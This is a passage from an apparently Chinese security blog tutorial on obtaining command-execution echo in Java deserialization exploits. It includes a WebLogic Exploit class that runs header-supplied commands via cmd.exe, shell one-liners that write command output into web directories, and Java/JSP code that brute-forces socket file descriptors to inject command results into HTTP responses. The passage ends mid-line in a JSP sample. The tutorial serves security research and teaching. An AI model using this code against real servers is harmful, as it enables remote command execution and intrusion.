class="keyword">return</span> buffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221135505051.png" alt="image-20201221135505051"></p>
<h3 id="WebLogic回显"><a href="#WebLogic回显" class="headerlink" title="WebLogic回显"></a>WebLogic回显</h3><p>​        根据lufei在<code>weblogic_2019_2725poc与回显构造</code>中的分析，可以通过获取当前请求线程中的header和response对象，在header中获取请求参数，在response中通过<code>response.getOutputStream().write(&quot;xxxx&quot;);</code> 来获取命令执行的结果,代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String lfcmd = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(<span class="string">"lfcmd"</span>);</span><br><span class="line">weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();</span><br><span class="line">weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();</span><br><span class="line">outputStream.writeStream(<span class="keyword">new</span> weblogic.xml.util.StringInputStream(lfcmd));</span><br><span class="line">outputStream.flush();</span><br><span class="line">response.getWriter().write(<span class="string">""</span>);</span><br></pre></td></tr></table></figure>

<p>​        这种获取回显的方法也可以配合到LDAP和RMI等协议获取回显的方式中，首先我们编写一个Exploit.java内容如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String lfcmd = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(<span class="string">"lfcmd"</span>);</span><br><span class="line">        String[] cmds = <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, lfcmd&#125;;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">        String output = s.hasNext() ? s.next() : <span class="string">""</span>;</span><br><span class="line">        weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();</span><br><span class="line">        weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();</span><br><span class="line">        outputStream.writeStream(<span class="keyword">new</span> weblogic.xml.util.StringInputStream(output));</span><br><span class="line">        outputStream.flush();</span><br><span class="line">        response.getWriter().write(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​     在自己的VPS上开启LDAP服务，执行结果如下</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221152936908.png" alt="image-20201221152936908"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221152826165.png" alt="image-20201221152826165"></p>
<h3 id="Windows回显"><a href="#Windows回显" class="headerlink" title="Windows回显"></a>Windows回显</h3><h4 id="执行结果写入web目录"><a href="#执行结果写入web目录" class="headerlink" title="执行结果写入web目录"></a>执行结果写入web目录</h4><p>​        当我们在一些web网站测试过程中遇到了没有回显的命令执行漏洞，可以通过将命令执行结果写入到web目录下的文件的方式获取回显，首先要解决一个问题是怎么才能找到当前网站的目录呢？可以通过<code>dir /s /b e:\web.xml</code>这种方式获取e盘下所有的web.xml的目录。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221162728556.png" alt="image-20201221162728556"></p>
<p>​        其次我们可以将我们命令执行的结果循环写入到找到的这些文件的目录中，利用代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &#x2F;c &quot;for &#x2F;f %i in (&#39;dir &#x2F;s &#x2F;b e:tomcat.css&#39;) do (echo %i&gt; %i.path.txt) &amp; (ipconfig &gt; %i.cmd.txt)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221162905061.png" alt="image-20201221162905061"></p>
<p>​        如果是通过GET方式进行利用，需要将请求的内容编码，否则会下入不成功。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221163149040.png" alt="image-20201221163149040"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221163227146.png" alt="image-20201221163227146"></p>
<p>​        由于使用这种方式写入回显会向匹配到的结果循环写入文件，所以我们在选择要匹配的文件名的时候，尽量选择一些不容易和其他项目重复的文件名。</p>
<h4 id="socket文件描述符回显"><a href="#socket文件描述符回显" class="headerlink" title="socket文件描述符回显"></a>socket文件描述符回显</h4><p>​        对服务端发起请求时会对应一个socket的文件描述符，我们可以获得当前请求的文件描述符，并在相应中写入回显内容。使用这种方法我们需要明白两个问题</p>
<ul>
<li><p>如何在java中获取当前的socket文件描述符？</p>
<p>目前没有比较好的方法可以获取到当前请求的文件描述符,一般是通过暴力枚举文件操作符，再通过某些方式判断枚举的文件描述符是否有效，可以通过sun.nio.ch.Net#remoteAddress验证文件操作符是否有效，最后通过一些条件比如请求IP来过滤文件操作符是否来自于本次请求。</p>
</li>
<li><p>如何向socket文件描述符写入数据？</p>
<p>可以通过FileOutputStream或其子类写入回显数据。</p>
<p>参考<code>https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Windows/code/WindowsEcho.jsp</code>测试类，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/test"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, NoSuchMethodException, ClassNotFoundException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(java.io.File.separator.equals(<span class="string">"\\"</span>))&#123;</span><br><span class="line">            java.lang.reflect.Field field = java.io.FileDescriptor.class.getDeclaredField("fd");</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            Class clazz1 = Class.forName(<span class="string">"sun.nio.ch.Net"</span>);</span><br><span class="line">            java.lang.reflect.Method method1 = clazz1.getDeclaredMethod(<span class="string">"remoteAddress"</span>,<span class="keyword">new</span> Class[]&#123;java.io.FileDescriptor<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">            method1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            Class clazz2 = Class.forName(<span class="string">"java.net.SocketOutputStream"</span>, <span class="keyword">false</span>, <span class="keyword">null</span>);</span><br><span class="line">            java.lang.reflect.Constructor constructor2 = clazz2.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">            constructor2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            Class clazz3 = Class.forName(<span class="string">"java.net.PlainSocketImpl"</span>);</span><br><span class="line">            java.lang.reflect.Constructor constructor3 = clazz3.getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;java.io.FileDescriptor<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">            constructor3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            java.lang.reflect.Method write = clazz2.getDeclaredMethod(<span class="string">"write"</span>,<span class="keyword">new</span> Class[]&#123;<span class="keyword">byte</span>[]<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">            write.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            java.net.InetSocketAddress remoteAddress = <span class="keyword">null</span>;</span><br><span class="line">            java.util.List list = <span class="keyword">new</span> java.util.ArrayList();</span><br><span class="line">            java.io.FileDescriptor fileDescriptor = <span class="keyword">new</span> java.io.FileDescriptor();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++)&#123;</span><br><span class="line">                field.set((Object)fileDescriptor, (Object)(<span class="keyword">new</span> Integer(i)));</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    remoteAddress= (java.net.InetSocketAddress) method1.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;fileDescriptor&#125;);</span><br><span class="line">                    <span class="keyword">if</span>(remoteAddress.toString().startsWith(<span class="string">"/127.0.0.1"</span>)) <span class="keyword">continue</span>;</span><br><span class="line">                    <span class="keyword">if</span>(remoteAddress.toString().startsWith(<span class="string">"/0:0:0:0:0:0:0:1"</span>)) <span class="keyword">continue</span>;</span><br><span class="line">                    list.add(<span class="keyword">new</span> Integer(i));</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = list.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    field.set((Object)fileDescriptor, list.get(i));</span><br><span class="line">                    Object socketOutputStream = constructor2.newInstance(<span class="keyword">new</span> Object[]&#123;constructor3.newInstance(<span class="keyword">new</span> Object[]&#123;fileDescriptor&#125;)&#125;);</span><br><span class="line">                    String[] cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>,<span class="string">"/C"</span>, <span class="string">"whoami"</span>&#125;;</span><br><span class="line">                    String res = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next().trim();</span><br><span class="line">                    String result = <span class="string">"HTTP/1.1 200 OK\nConnection: close\nContent-Length: "</span> + (res.length()) + <span class="string">"\n\n"</span> + res + <span class="string">"\n\n"</span>;</span><br><span class="line">                    write.invoke(socketOutputStream, <span class="keyword">new</span> Object[]&#123;result.getBytes()&#125;);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    <span class="comment">//pass</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221183135520.png" alt="image-20201221183135520"></p>
<p>​    我将上面的代码分为几段来讲解,先看一下第一段的代码，代码的说明我会写到注释中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field field =java.io.FileDescriptor.class.getDeclaredField("fd");  //通过反射获取FileDescriptor的fd属性，</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);  <span class="comment">//由于fd属性是private，因此需要设置访问权限才能正常使用</span></span><br><span class="line">Class clazz1 = Class.forName(<span class="string">"sun.nio.ch.Net"</span>); <span class="comment">//获取Net类的Class对象</span></span><br><span class="line">java.lang.reflect.Method method1 = clazz1.getDeclaredMethod(<span class="string">"remoteAddress"</span>,<span class="keyword">new</span> Class[]&#123;java.io.FileDescriptor<span class="class">.<span class="keyword">class</span>&#125;)</span>; <span class="comment">//获取sun.nio.ch.Net#remoteAddress方法</span></span><br><span class="line">method1.setAccessible(<span class="keyword">true</span>); <span class="comment">//由于remoteAddress方法不是public所以需要设置访问权限才能调用</span></span><br><span class="line">java.net.InetSocketAddress remoteAddress = <span class="keyword">null</span>;</span><br><span class="line">java.util.List list = <span class="keyword">new</span> java.util.ArrayList(); <span class="comment">//创建一个list列表，用来存储可以满足需求的文件描述符ID</span></span><br><span class="line">java.io.FileDescriptor fileDescriptor = <span class="keyword">new</span> java.io.FileDescriptor(); <span class="comment">//创建fileDescriptor对象</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++)&#123; <span class="comment">//循环遍历文件描述符ID</span></span><br><span class="line">          field.set((Object)fileDescriptor, (Object)(<span class="keyword">new</span> Integer(i)));<span class="comment">//设置fd属性的值为i</span></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">    remoteAddress= (java.net.InetSocketAddress) method1.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;fileDescriptor&#125;); <span class="comment">//通过反射调用sun.nio.ch.Net#remoteAddress方法，并传入fileDescriptor对象。</span></span><br><span class="line">    <span class="keyword">if</span>(remoteAddress.toString().startsWith(<span class="string">"/127.0.0.1"</span>)) <span class="keyword">continue</span>; <span class="comment">//当通过remoteAddress获取的内容包含127.0.0.1是，也就是这个请求时127.0.0.1则排除</span></span><br><span class="line">    <span class="keyword">if</span>(remoteAddress.toString().startsWith(<span class="string">"/0:0:0:0:0:0:0:1"</span>)) <span class="keyword">continue</span>;</span><br><span class="line">      list.add(<span class="keyword">new</span> Integer(i)); <span class="comment">//满足条件则添加</span></span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>​        我们看一下remoteAddress是如何验证socket是否存在的？</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221193820631.png" alt="image-20201221193820631"></p>
<p>​    在remoteInetAddress方法中，会通过我们传入的FileDescriptor的值判断socket是否存在，当不存在是会抛出socket异常。</p>
</li>
</ul>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221193915547.png" alt="image-20201221193915547"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221194018415.png" alt="image-20201221194018415"></p>
<p>​        remoteInetAddress的实现在native层，也就是C来实现的，如果想要查看对应的C代码可以下载Openjdk来查看，remoteInetAddress的实现代码如下，在remoteInetAddress中会调用getpeername来获取socket的ip和端口号，获取失败则会pa</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222095043479.png" alt="image-20201222095043479"></p>
<p>​        如果remoteInetAddress方法可以正常获取，则返回InetSocketAddressHolder对象，在这个对象中包含hostname,addr,port等信息。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221194132910.png" alt="image-20201221194132910"></p>
<p>​        我们再看下第二段代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Class clazz2 = Class.forName(<span class="string">"java.net.SocketOutputStream"</span>, <span class="keyword">false</span>, <span class="keyword">null</span>);</span><br><span class="line">java.lang.reflect.Constructor constructor2 = clazz2.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor2.setAccessible(<span class="keyword">true</span>); <span class="comment">//通过反射调用获取SocketOutputStream的构造器</span></span><br><span class="line"></span><br><span class="line">Class clazz3 = Class.forName(<span class="string">"java.net.PlainSocketImpl"</span>);</span><br><span class="line">java.lang.reflect.Constructor constructor3 = clazz3.getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;java.io.FileDescriptor<span class="class">.<span class="keyword">class</span>&#125;)</span>; <span class="comment">//通过反射获取PlainSocketImpl的有参构造器。</span></span><br><span class="line">constructor3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">java.lang.reflect.Method write = clazz2.getDeclaredMethod(<span class="string">"write"</span>,<span class="keyword">new</span> Class[]&#123;<span class="keyword">byte</span>[]<span class="class">.<span class="keyword">class</span>&#125;)</span>;  <span class="comment">//调用java.net.SocketOutputStream#write方法，并传入byte[]数组</span></span><br><span class="line"> write.setAccessible(<span class="keyword">true</span>); <span class="comment">//更改write方法的访问权限</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = list.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123; <span class="comment">//循环向所有满足条件的socket中写入命令执行的结果。</span></span><br><span class="line">     <span class="keyword">try</span>&#123;</span><br><span class="line">       field.set((Object)fileDescriptor, list.get(i)); <span class="comment">//设置fileDescriptor的fd属性</span></span><br><span class="line"> Object socketOutputStream = constructor2.newInstance(<span class="keyword">new</span> Object[]&#123;constructor3.newInstance(<span class="keyword">new</span> Object[]&#123;fileDescriptor&#125;)&#125;); <span class="comment">//通过反射创建socketOutputStream实例并传入PlainSocketImpl的实例。</span></span><br><span class="line">     String[] cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>,<span class="string">"/C"</span>, <span class="string">"whoami"</span>&#125;;  </span><br><span class="line">     String res = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next().trim(); <span class="comment">//命令执行结果</span></span><br><span class="line">     String result = <span class="string">"HTTP/1.1 200 OK\nConnection: close\nContent-Length: "</span> + (res.length()) + <span class="string">"\n\n"</span> + res + <span class="string">"\n\n"</span>;  <span class="comment">//将命令执行的结果和响应头的部分拼接</span></span><br><span class="line">      write.invoke(socketOutputStream, <span class="keyword">new</span> Object[]&#123;result.getBytes()&#125;);</span><br><span class="line">                    <span class="keyword">break</span>; <span class="comment">//调用socketOutputStream的write方法写入命令执行结果。</span></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    <span class="comment">//pass</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>​        socketOutputStream的构造参数需要传入AbstractPlainSocketImpl类型的参数。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221200058463.png" alt="image-20201221200058463"></p>
<p>​        而PlainSocketImpl是AbstractPlainSocketImpl的子类，因此其返回的实例可以作为socketOutputStream的参数传入。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221200144137.png" alt="image-20201221200144137"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221200243072.png" alt="image-20201221200243072"></p>
<p>​        为什么我们的写入socket数据的时候需要加入HTTP响应头？</p>
<p>​        我们抓包进行分析，可以看到我们写入的内容在真实的请求头之前，所以在我们写入数据时需要先添加一个请求头避免无法正常响应。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221200405698.png" alt="image-20201221200405698"></p>
<h3 id="Linux回显"><a href="#Linux回显" class="headerlink" title="Linux回显"></a>Linux回显</h3><h4 id="执行结果写入web目录-1"><a href="#执行结果写入web目录-1" class="headerlink" title="执行结果写入web目录"></a>执行结果写入web目录</h4><p>​        这种实现方法和windows的方法类似，也是通过查找某些指定的文件名的位置，并将命令执行的结果写入到找到的文件目录中,运行如下命令，可以将命令执行的结果写入到web.xml同级目录下的test.txt中</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name web.xml|while read f;do sh -c 'id;pwd;ifconfig' &gt;$(dirname $f)/test.txt;done</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222102651892.png" alt="image-20201222102651892"></p>
<h4 id="socket文件描述符回显-1"><a href="#socket文件描述符回显-1" class="headerlink" title="socket文件描述符回显"></a>socket文件描述符回显</h4><p>​        在Linux中，可以通过命令来查看文件描述符从而获取到socket的连接信息,<code>cat /proc/net/tcp</code></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222110758528.png" alt="image-20201222110758528"></p>
<p>​        假如我们通过<code>nc -lvvp 8888</code>开启一个监听，我们如何找到对应的socket连接，首先<code>ps -elf|grep nc</code> 找到监听对应的进程ID。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222145124269.png" alt="image-20201222145124269"></p>
<pre><code>根据进程ID找到对应的socket文件，socket后的数字代表INode</code></pre><p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222145240659.png" alt="image-20201222145240659"></p>
<p>​        最后，我们就可以根据找到的Inode的信息找到对应的socket，<code>cat /proc/net/tcp|grep 2664048</code>并且可以获取源端口和地址还有目的端口和地址。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222145717578.png" alt="image-20201222145717578"></p>
<p>​        我们也可以根据请求的端口来找到对应的socket的Inode <code>cat /proc/net/tcp|awk &#39;{if($10&gt;0)print}&#39;|grep -i 125D|awk &#39;{print $10}&#39;</code></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222151828714.png" alt="image-20201222151828714"></p>
<p>​        再根据Inode和进程id来获取fd也就是socket文件描述符的值<code>ls -l /proc/32591/fd|grep 2664048|awk &#39;{print $9}&#39;</code>。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222151905568.png" alt="image-20201222151905568"></p>
<p>​        我们分析一下<code>https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Linux/code/case2.jsp</code>的实现,首先看一下执行结果，基本上可以稳定的获取到回显的结果。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222152243073.png" alt="image-20201222152243073"></p>
<p>​        代码实现如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(java.io.File.separator.equals(<span class="string">"/"</span>))&#123;</span><br><span class="line">        String command  = <span class="string">"ls -al /proc/$PPID/fd|grep socket:|awk 'BEGIN&#123;FS=\"[\"&#125;''&#123;print $2&#125;'|sed 's/.$//'"</span>;  <span class="comment">//获取当前所有的Inode的值</span></span><br><span class="line">        String[] cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, command&#125;;</span><br><span class="line">        java.io.BufferedReader br = <span class="keyword">new</span> java.io.BufferedReader(<span 